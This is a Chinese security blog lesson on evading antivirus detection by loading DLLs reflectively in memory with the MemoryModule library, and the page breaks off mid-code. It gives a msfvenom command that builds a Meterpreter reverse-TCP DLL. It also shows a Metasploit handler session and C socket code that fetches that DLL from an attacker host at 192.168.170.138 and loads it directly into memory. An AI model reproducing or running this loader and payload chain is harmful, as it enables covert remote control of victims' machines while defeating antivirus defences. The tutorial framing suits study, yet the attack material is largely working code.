<!doctype html><html class="not-ready lg:text-base" style=--bg:#faf8f1 lang=zh-cn dir=ltr><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><title>静态恶意代码逃逸（第六课） - 倾旋的博客</title><meta name=theme-color><meta name=description content='代码将会上传至Github，方便读者下载研究 : https://github.com/Rvn0xsy/BadCode
0x01 MemoryModule
先来介绍以下MemoryModule这个项目的来源。
MemoryModule-实现原理
项目背景：Windows操作系统在执行一个Windows PE格式的文件时，Windows自身是有一个Windows PE格式的解析器，通过PE格式把文件的各个节放入不同的内存区域。
爱折腾的程序员自己也想实现这个过程，那就是反射，这个反射机制就是将Windows PE格式通过自己写的代码进行解析，并把不同的节数据加载到内存中，通常这个反射加载技术被很多APT组织、大型渗透框架、病毒作者使用比较广泛。
当一个Windows PE格式的文件变成了一个内存中的字符串，意味着这个文件可以被任意方式去转换、加密、混淆，因此反病毒软件也难以查杀。
MemoryModule就是实现了这个过程：https://github.com/fancycode/MemoryModule
但是资料都是英文的，我在国内的社区上找到了中文版本的：https://gitee.com/china_jeffery/MemoryModule
0x02 反射DLL加载的实验
首先体验一下正常DLL加载的过程：
写一个DLL：
#include <Windows.h>

VOID msg(VOID){
	MessageBox(NULL,TEXT("Test"),TEXT("Hello"),MB_OK);
	return;
}
这里我采用了Def文件来进行导出：


#include <Windows.h>;

typedef VOID (*msg)(VOID);

int main()
{
	msg RunMsg;
	HMODULE  hBadCode = LoadLibrary(TEXT("BadCode-DLL.dll"));

	RunMsg = (msg)GetProcAddress(hBadCode,"msg");
	RunMsg();
	FreeLibrary(hBadCode);

	return 0;
}
通过LoadLibrary这个API来加载DLL文件，使其运行，看起来是一个基础操作，那么还有另外一种方式吗？
接下来贴上MemoryModule的使用方法：

将要加载的PE文件读入内存
初始化MemoryModule句柄
装载内存
获得导出函数地址
执行导出函数
释放MemoryModule句柄

这里我将MemoryModule项目代码放入当前项目：

主要是：MemoryModule.h、MemoryModule.cpp
加载代码
#include <Windows.h>;
#include <stdio.h>
#include "MemoryModule.h"

typedef VOID (*msg)(VOID);

// 打开文件并获取大小
DWORD OpenBadCodeDLL(HANDLE & hBadCodeDll, LPCWSTR lpwszBadCodeFileName){
	DWORD dwHighFileSize = 0;
	DWORD dwLowFileSize = 0;
	// 打开文件
	hBadCodeDll = CreateFile(lpwszBadCodeFileName,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL ,NULL);
	if(hBadCodeDll == INVALID_HANDLE_VALUE){
		return GetLastError();
	}
	dwLowFileSize = GetFileSize(hBadCodeDll,&amp;dwHighFileSize);
	return dwLowFileSize;
}


int main()
{
	msg RunMsg;  // msg函数的函数指针
	HMEMORYMODULE hModule; // MemoryModule句柄，应该可以这么理解,,
	HANDLE hBadCodeDll = INVALID_HANDLE_VALUE; // 打开PE文件的句柄
	WCHAR szBadCodeFile[] = TEXT("C:\\Users\\admin\\Documents\\Visual Studio 2012\\Projects\\BadCode\\Debug\\BadCode-DLL.dll"); // PE文件的物理路径
	DWORD dwFileSize = 0; // PE文件大小
	DWORD dwReadOfFileSize = 0; // 已读取的PE文件大小
	PBYTE bFileBuffer = NULL; // PE文件的内存地址
	
	// 打开文件
	dwFileSize = OpenBadCodeDLL(hBadCodeDll, szBadCodeFile);
	// 如果打开失败直接退出
	if(hBadCodeDll == INVALID_HANDLE_VALUE){
		return GetLastError();
	}
	// 申请放置PE文件的内存空间
	bFileBuffer = new BYTE[dwFileSize];
	// 读取文件
	ReadFile(hBadCodeDll,bFileBuffer,dwFileSize,&amp;dwReadOfFileSize,NULL);
	// 如果读取错误直接退出
	if(dwReadOfFileSize != dwFileSize){
		return GetLastError();
	}
	// 关闭打开PE文件的句柄
	CloseHandle(hBadCodeDll);
	// 导入PE文件
	hModule = MemoryLoadLibrary(bFileBuffer);
	// 如果加载失败，就退出
	if(hModule == NULL){
		delete [] bFileBuffer;
		return -1;
	}
	// 获取msg导出函数地址
	RunMsg = (msg)MemoryGetProcAddress(hModule,"msg");
	// 运行msg函数
	RunMsg();
	// 释放资源
	MemoryFreeLibrary(hModule);
	// 释放PE内存
	delete [] bFileBuffer;

	return GetLastError();
}
运行结果：'><meta name=author content="倾旋的博客"><link rel="preload stylesheet" as=style href=https://payloads.online/main.min.css><link rel=preload as=image href=https://payloads.online/theme.png><link rel=preload as=image href=/avatar.jpeg><script defer src=https://payloads.online/highlight.min.js onload=hljs.initHighlightingOnLoad()></script><link rel=icon href=https://payloads.online/favicon.ico><link rel=apple-touch-icon href=https://payloads.online/apple-touch-icon.png><meta name=generator content="Hugo 0.148.2"><meta itemprop=name content="静态恶意代码逃逸（第六课）"><meta itemprop=description content="本节课，我们来代入一个新的技术，这个技术与Windows PE格式的基础知识关联性较强，目的是实现全球AV查杀0报警的效果。"><meta itemprop=datePublished content="2020-01-02T00:00:00+00:00"><meta itemprop=dateModified content="2020-01-02T00:00:00+00:00"><meta itemprop=wordCount content="577"><meta property="og:url" content="https://payloads.online/archivers/2020-01-02/1/"><meta property="og:site_name" content="倾旋的博客"><meta property="og:title" content="静态恶意代码逃逸（第六课）"><meta property="og:description" content="本节课，我们来代入一个新的技术，这个技术与Windows PE格式的基础知识关联性较强，目的是实现全球AV查杀0报警的效果。"><meta property="og:locale" content="zh_cn"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2020-01-02T00:00:00+00:00"><meta property="article:modified_time" content="2020-01-02T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="静态恶意代码逃逸（第六课）"><meta name=twitter:description content="本节课，我们来代入一个新的技术，这个技术与Windows PE格式的基础知识关联性较强，目的是实现全球AV查杀0报警的效果。"><link rel=canonical href=https://payloads.online/archivers/2020-01-02/1/></head><body class="bg-(--bg) text-black antialiased duration-200 ease-out [-webkit-tap-highlight-color:transparent] dark:text-white"><header class="mx-auto flex h-[4.5rem] max-w-(--w) px-8 whitespace-nowrap lg:justify-center"><div class="relative z-50 flex items-center ltr:mr-auto rtl:ml-auto"><a class="-translate-y-[1px] text-2xl font-medium" href=https://payloads.online/>倾旋的博客</a><div class="btn-dark text-[0px] ltr:ml-4 rtl:mr-4 h-6 w-6 shrink-0 cursor-pointer [background:url(./theme.png)_left_center/_auto_theme('spacing.6')_no-repeat] [transition:_background-position_0.4s_steps(5)] dark:[background-position:right]" role=button aria-label=Dark></div></div><div class="btn-menu relative z-50 flex h-[4.5rem] w-[5rem] shrink-0 cursor-pointer flex-col items-center justify-center gap-2.5 lg:hidden ltr:-mr-8 rtl:-ml-8" role=button aria-label=Menu></div><script>const htmlClass=document.documentElement.classList;setTimeout(()=>{htmlClass.remove("not-ready")},10);const btnMenu=document.querySelector(".btn-menu");btnMenu.addEventListener("click",()=>{htmlClass.toggle("open")});const metaTheme=document.querySelector('meta[name="theme-color"]'),lightBg="#faf8f1".replace(/"/g,""),setDark=e=>{metaTheme.setAttribute("content",e?"#000":lightBg),htmlClass[e?"add":"remove"]("dark"),localStorage.setItem("dark",e)},darkScheme=window.matchMedia("(prefers-color-scheme: dark)");if(htmlClass.contains("dark"))setDark(!0);else{const e=localStorage.getItem("dark");setDark(e?e==="true":darkScheme.matches)}darkScheme.addEventListener("change",e=>{setDark(e.matches)});const btnDark=document.querySelector(".btn-dark");btnDark.addEventListener("click",()=>{setDark(localStorage.getItem("dark")!=="true")})</script><div class="nav-wrapper fixed inset-x-0 top-full z-40 flex h-full flex-col justify-center bg-(--bg) pb-16 duration-200 select-none lg:static lg:h-auto lg:flex-row lg:bg-transparent! lg:pb-0 lg:transition-none"><nav class="lg:ml-12 lg:flex lg:flex-row lg:items-center lg:space-x-10 rtl:space-x-reverse"><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/>首页</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/posts/>文章列表</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/tags>标签</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/projects>开源项目</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/about>关于我</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/links/>友情链接</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/message>留言</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/sponsor>赞助</a></nav></div></header><main class="prose prose-neutral dark:prose-invert relative mx-auto min-h-[calc(100vh-9rem)] max-w-(--w) px-8 pt-14 pb-16"><article><header class=mb-14><h1 class="my-0! pb-2.5">静态恶意代码逃逸（第六课）</h1><div class="text-xs antialiased opacity-60"><time>Jan 2, 2020</time><span class=mx-1>&#183;</span>
<span>倾旋</span></div></header><section><p>代码将会上传至Github，方便读者下载研究 : <a href=https://github.com/Rvn0xsy/BadCode>https://github.com/Rvn0xsy/BadCode</a></p><h2 id=0x01-memorymodule>0x01 MemoryModule</h2><p>先来介绍以下MemoryModule这个项目的来源。</p><p><a href=https://payloads.online/archivers/2019-03-14/1>MemoryModule-实现原理</a></p><p>项目背景：Windows操作系统在执行一个Windows PE格式的文件时，Windows自身是有一个Windows PE格式的解析器，通过PE格式把文件的各个节放入不同的内存区域。</p><p>爱折腾的程序员自己也想实现这个过程，那就是反射，这个反射机制就是将Windows PE格式通过自己写的代码进行解析，并把不同的节数据加载到内存中，通常这个反射加载技术被很多APT组织、大型渗透框架、病毒作者使用比较广泛。</p><p>当一个Windows PE格式的文件变成了一个内存中的字符串，意味着这个文件可以被任意方式去转换、加密、混淆，因此反病毒软件也难以查杀。</p><p>MemoryModule就是实现了这个过程：https://github.com/fancycode/MemoryModule</p><p>但是资料都是英文的，我在国内的社区上找到了中文版本的：https://gitee.com/china_jeffery/MemoryModule</p><h2 id=0x02-反射dll加载的实验>0x02 反射DLL加载的实验</h2><p>首先体验一下正常DLL加载的过程：</p><p>写一个DLL：</p><pre tabindex=0><code>#include &lt;Windows.h&gt;

VOID msg(VOID){
	MessageBox(NULL,TEXT(&#34;Test&#34;),TEXT(&#34;Hello&#34;),MB_OK);
	return;
}
</code></pre><p>这里我采用了Def文件来进行导出：</p><p><img src=https://images.payloads.online/81d0151a-4f5f-11ec-a1bd-00d861bf4abb.png alt=2020-01-03-13-05-56></p><p><img src=https://images.payloads.online/820ac94e-4f5f-11ec-ba78-00d861bf4abb.png alt=2020-01-03-13-06-15></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;Windows.h&gt;;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>typedef</span> <span style=color:#a6e22e>VOID</span> (<span style=color:#f92672>*</span>msg)(VOID);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	msg RunMsg;
</span></span><span style=display:flex><span>	HMODULE  hBadCode <span style=color:#f92672>=</span> <span style=color:#a6e22e>LoadLibrary</span>(<span style=color:#a6e22e>TEXT</span>(<span style=color:#e6db74>&#34;BadCode-DLL.dll&#34;</span>));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	RunMsg <span style=color:#f92672>=</span> (msg)<span style=color:#a6e22e>GetProcAddress</span>(hBadCode,<span style=color:#e6db74>&#34;msg&#34;</span>);
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>RunMsg</span>();
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>FreeLibrary</span>(hBadCode);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>通过LoadLibrary这个API来加载DLL文件，使其运行，看起来是一个基础操作，那么还有另外一种方式吗？</p><p>接下来贴上MemoryModule的使用方法：</p><ol><li>将要加载的PE文件读入内存</li><li>初始化MemoryModule句柄</li><li>装载内存</li><li>获得导出函数地址</li><li>执行导出函数</li><li>释放MemoryModule句柄</li></ol><p>这里我将MemoryModule项目代码放入当前项目：</p><p><img src=https://images.payloads.online/824455c4-4f5f-11ec-b777-00d861bf4abb.png alt=2020-01-03-13-06-38></p><p>主要是：<code>MemoryModule.h</code>、<code>MemoryModule.cpp</code></p><p>加载代码</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;Windows.h&gt;;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&#34;MemoryModule.h&#34;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>typedef</span> <span style=color:#a6e22e>VOID</span> (<span style=color:#f92672>*</span>msg)(VOID);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// 打开文件并获取大小
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>DWORD <span style=color:#a6e22e>OpenBadCodeDLL</span>(HANDLE <span style=color:#f92672>&amp;</span> hBadCodeDll, LPCWSTR lpwszBadCodeFileName){
</span></span><span style=display:flex><span>	DWORD dwHighFileSize <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>	DWORD dwLowFileSize <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>	<span style=color:#75715e>// 打开文件
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	hBadCodeDll <span style=color:#f92672>=</span> <span style=color:#a6e22e>CreateFile</span>(lpwszBadCodeFileName,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL ,NULL);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span>(hBadCodeDll <span style=color:#f92672>==</span> INVALID_HANDLE_VALUE){
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> <span style=color:#a6e22e>GetLastError</span>();
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	dwLowFileSize <span style=color:#f92672>=</span> <span style=color:#a6e22e>GetFileSize</span>(hBadCodeDll,<span style=color:#f92672>&amp;</span>dwHighFileSize);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> dwLowFileSize;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	msg RunMsg;  <span style=color:#75715e>// msg函数的函数指针
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	HMEMORYMODULE hModule; <span style=color:#75715e>// MemoryModule句柄，应该可以这么理解,,
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	HANDLE hBadCodeDll <span style=color:#f92672>=</span> INVALID_HANDLE_VALUE; <span style=color:#75715e>// 打开PE文件的句柄
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	WCHAR szBadCodeFile[] <span style=color:#f92672>=</span> <span style=color:#a6e22e>TEXT</span>(<span style=color:#e6db74>&#34;C:</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Users</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>admin</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Documents</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Visual Studio 2012</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Projects</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>BadCode</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Debug</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>BadCode-DLL.dll&#34;</span>); <span style=color:#75715e>// PE文件的物理路径
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	DWORD dwFileSize <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; <span style=color:#75715e>// PE文件大小
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	DWORD dwReadOfFileSize <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; <span style=color:#75715e>// 已读取的PE文件大小
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	PBYTE bFileBuffer <span style=color:#f92672>=</span> NULL; <span style=color:#75715e>// PE文件的内存地址
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	
</span></span><span style=display:flex><span>	<span style=color:#75715e>// 打开文件
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	dwFileSize <span style=color:#f92672>=</span> <span style=color:#a6e22e>OpenBadCodeDLL</span>(hBadCodeDll, szBadCodeFile);
</span></span><span style=display:flex><span>	<span style=color:#75715e>// 如果打开失败直接退出
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#66d9ef>if</span>(hBadCodeDll <span style=color:#f92672>==</span> INVALID_HANDLE_VALUE){
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> <span style=color:#a6e22e>GetLastError</span>();
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#75715e>// 申请放置PE文件的内存空间
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	bFileBuffer <span style=color:#f92672>=</span> new BYTE[dwFileSize];
</span></span><span style=display:flex><span>	<span style=color:#75715e>// 读取文件
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#a6e22e>ReadFile</span>(hBadCodeDll,bFileBuffer,dwFileSize,<span style=color:#f92672>&amp;</span>dwReadOfFileSize,NULL);
</span></span><span style=display:flex><span>	<span style=color:#75715e>// 如果读取错误直接退出
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#66d9ef>if</span>(dwReadOfFileSize <span style=color:#f92672>!=</span> dwFileSize){
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> <span style=color:#a6e22e>GetLastError</span>();
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#75715e>// 关闭打开PE文件的句柄
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#a6e22e>CloseHandle</span>(hBadCodeDll);
</span></span><span style=display:flex><span>	<span style=color:#75715e>// 导入PE文件
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	hModule <span style=color:#f92672>=</span> <span style=color:#a6e22e>MemoryLoadLibrary</span>(bFileBuffer);
</span></span><span style=display:flex><span>	<span style=color:#75715e>// 如果加载失败，就退出
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#66d9ef>if</span>(hModule <span style=color:#f92672>==</span> NULL){
</span></span><span style=display:flex><span>		delete [] bFileBuffer;
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#75715e>// 获取msg导出函数地址
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	RunMsg <span style=color:#f92672>=</span> (msg)<span style=color:#a6e22e>MemoryGetProcAddress</span>(hModule,<span style=color:#e6db74>&#34;msg&#34;</span>);
</span></span><span style=display:flex><span>	<span style=color:#75715e>// 运行msg函数
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#a6e22e>RunMsg</span>();
</span></span><span style=display:flex><span>	<span style=color:#75715e>// 释放资源
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#a6e22e>MemoryFreeLibrary</span>(hModule);
</span></span><span style=display:flex><span>	<span style=color:#75715e>// 释放PE内存
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	delete [] bFileBuffer;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> <span style=color:#a6e22e>GetLastError</span>();
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>运行结果：</p><p><img src=https://images.payloads.online/8277ad7a-4f5f-11ec-9a01-00d861bf4abb.png alt=2020-01-03-13-06-52></p><p>能够看到，成功加载并执行了msg函数。</p><h2 id=0x03-反射dll与msf联动>0x03 反射DLL与MSF联动</h2><p>不知道大家还是否记得第五课的Socket方式加载Shellcode，这里我将复用第五课的代码来实现与MSF的联动免杀。</p><p>思路是这样的：</p><p>通过Socket将Msf生成的DLL给接收到内存中，然后载入MemoryModule中，直接执行。</p><h3 id=生成dll>生成DLL</h3><pre tabindex=0><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.170.138 LPORT=8899 -f dll -o ~/y.dll
</code></pre><p><img src=https://images.payloads.online/82b32ae4-4f5f-11ec-80f1-00d861bf4abb.png alt=2020-01-03-13-07-02></p><p><strong>生成了一个5120字节的DLL</strong></p><p>然后设置一下MSF DLL发射器：</p><pre tabindex=0><code>msf5 &gt; handler -p windows/x64/meterpreter/reverse_tcp -H 192.168.170.138 -P 8899
[*] Payload handler running as background job 0.

[*] Started reverse TCP handler on 192.168.170.138:8899 
msf5 &gt; use exploit/multi/handler 
msf5 exploit(multi/handler) &gt; set payload windows/patchupdllinject/reverse_tcp
payload =&gt; windows/patchupdllinject/reverse_tcp
msf5 exploit(multi/handler) &gt; set LHOST 192.168.170.138 
LHOST =&gt; 192.168.170.138
msf5 exploit(multi/handler) &gt; set LPORT 8888
LPORT =&gt; 8888
msf5 exploit(multi/handler) &gt; set DLL ~/y.dll
DLL =&gt; ~/y.dll
msf5 exploit(multi/handler) &gt; exploit -j
[*] Exploit running as background job 1.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 192.168.170.138:8888 
msf5 exploit(multi/handler) &gt; 
</code></pre><p>此时就需要来撸码了，实现一个客户端，去Msf上获取DLL：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;WinSock2.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;Windows.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&#34;MemoryModule.h&#34;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#pragma comment(lib,&#34;ws2_32.lib&#34;)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#75715e>#define PAYLOAD_SIZE 1024*512
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>typedef</span> <span style=color:#a6e22e>BOOL</span> (<span style=color:#f92672>*</span>Module)(HMODULE hModule, DWORD ul_reason_for_call , LPVOID lpReserved);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>typedef</span> <span style=color:#a6e22e>VOID</span> (<span style=color:#f92672>*</span>msg)(VOID);
</span></span><span style=display:flex><span>PBYTE bFileBuffer <span style=color:#f92672>=</span> NULL;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>BOOL <span style=color:#a6e22e>GetPEDLL</span>(){
</span></span><span style=display:flex><span>	
</span></span><span style=display:flex><span>	DWORD dwError;
</span></span><span style=display:flex><span>	WORD sockVersion <span style=color:#f92672>=</span> <span style=color:#a6e22e>MAKEWORD</span>(<span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>2</span>);
</span></span><span style=display:flex><span>	WSADATA wsaData;
</span></span><span style=display:flex><span>	SOCKET socks;
</span></span><span style=display:flex><span>	SHORT sListenPort <span style=color:#f92672>=</span> <span style=color:#ae81ff>8888</span>;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>struct</span> sockaddr_in sin;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>WSAStartup</span>(sockVersion, <span style=color:#f92672>&amp;</span>wsaData) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		dwError <span style=color:#f92672>=</span> <span style=color:#a6e22e>GetLastError</span>();
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[*]WSAStarup Error : %d </span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,dwError);
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> FALSE;
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	
</span></span><span style=display:flex><span>	socks <span style=color:#f92672>=</span> <span style=color:#a6e22e>socket</span>(AF_INET, SOCK_STREAM, IPPROTO_TCP);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (socks <span style=color:#f92672>==</span> INVALID_SOCKET)
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		dwError <span style=color:#f92672>=</span> <span style=color:#a6e22e>GetLastError</span>();
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[*]Socket Error : %d </span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,dwError);
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> FALSE;
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	sin.sin_family <span style=color:#f92672>=</span> AF_INET;
</span></span><span style=display:flex><span>	sin.sin_port <span style=color:#f92672>=</span> <span style=color:#a6e22e>htons</span>(sListenPort);
</span></span><span style=display:flex><span>	sin.sin_addr.S_un.S_addr <span style=color:#f92672>=</span> <span style=color:#a6e22e>inet_addr</span>(<span style=color:#e6db74>&#34;192.168.170.138&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>connect</span>(socks,(<span style=color:#66d9ef>struct</span> sockaddr <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>sin,<span style=color:#66d9ef>sizeof</span>(sin)) <span style=color:#f92672>==</span> SOCKET_ERROR )
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		dwError <span style=color:#f92672>=</span> <span style=color:#a6e22e>GetLastError</span>();
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[*]Bind Error : %d </span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,dwError);
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> FALSE;
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> ret <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>	ret <span style=color:#f92672>=</span> <span style=color:#a6e22e>recv</span>(socks,(PCHAR)bFileBuffer,<span style=color:#ae81ff>4</span>,NULL);
</span></span><span style=display:flex><span>	ret <span style=color:#f92672>=</span> <span style=color:#a6e22e>recv</span>(socks,(PCHAR)bFileBuffer,<span style=color:#ae81ff>2650</span>,NULL);
</span></span><span style=display:flex><span>	ret <span style=color:#f92672>=</span> <span style=color:#a6e22e>recv</span>(socks,(PCHAR)bFileBuffer,<span style=color:#ae81ff>4</span>,NULL);
</span></span><span style=display:flex><span>	ret <span style=color:#f92672>=</span> <span style=color:#a6e22e>recv</span>(socks,(PCHAR)bFileBuffer,<span style=color:#ae81ff>4</span>,NULL);
</span></span><span style=display:flex><span>	ret <span style=color:#f92672>=</span> <span style=color:#a6e22e>recv</span>(socks,(PCHAR)bFileBuffer,<span style=color:#ae81ff>4</span>,NULL);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>ZeroMemory</span>(bFileBuffer,PAYLOAD_SIZE);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	
</span></span><span style=display:flex><span>	ret <span style=color:#f92672>=</span> <span style=color:#a6e22e>recv</span>(socks,(PCHAR)bFileBuffer,<span style=color:#ae81ff>5120</span>,NULL);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (ret <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>closesocket</span>(socks);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> TRUE;
</span></span><span style=display:flex><span>} 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// 打开文件并获取大小
